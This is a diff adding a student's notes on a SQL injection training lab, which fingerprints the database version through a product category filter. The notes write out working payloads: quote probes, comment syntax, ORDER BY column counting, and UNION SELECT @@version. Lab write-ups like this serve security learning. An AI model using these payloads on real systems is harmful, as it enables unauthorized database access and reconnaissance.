@@ -1,0 +1,33 @@
+LAB 08: SQL injection attack, querying the database type and version on MySQL and Microsoft
+
+VULNERABLE CATEGORY: In the product category filter
+
+End Goal: Displaying the database type and the version
+
+ANALYSIS: 
+1. First I append single quote(')==> it does showing the internal server error
+  90% may be vulnerable to sqli
+2. Trying commenting out other queries how it responds: (--)==> It will gives me an Internal server error
+3. As the database is my sql and Microsoft I have to use comment like:
+    (3A)  *** -- - (give space after the double dash) ==> this becomes success, shows me a page
+
+4. NOW check for how much column is there:
+     (4A) ' ORDER BY 1-- - ==> Gives me an page
+     (4B) ' ORDER BY 2-- - ==> Gives me an page 
+     (4C) ' ORDER BY 3-- - ==> gives an internal server error so the total number of column:(3-1)=2      
+5. Now check for the what value does the columns holds:
+     (5A). ' UNION SELECT NULL,NULL-- - ==> it gives an 200 responds
+     (5B). ' UNION SELECT 'a','b'-- -   ==> it shows me a and b in the response
+
+6. Now, checking for the database version
+    (6A). SELECT @@version ==> ON Microsoft AND MySQL BOTH
+    (6B). Note Rabin Match the column to run it hai, like we run banner in second column in oracle database.
+    (6C). ' UNION SELECT NULL,@@version-- - ==> this does gives me an version of the database hai 
+
+
+MY MISTAKE WHILE DOING THIS LAB:
+1. I was trying to extract the version of the database without matching the column like: ' UNION SELECT @@version-- - ==> This would not work because kun column ma text dakhaune ta thai hudaina ne
+2. Don't repeat this mistake again Rabin.
+
+Let's script it.
+          
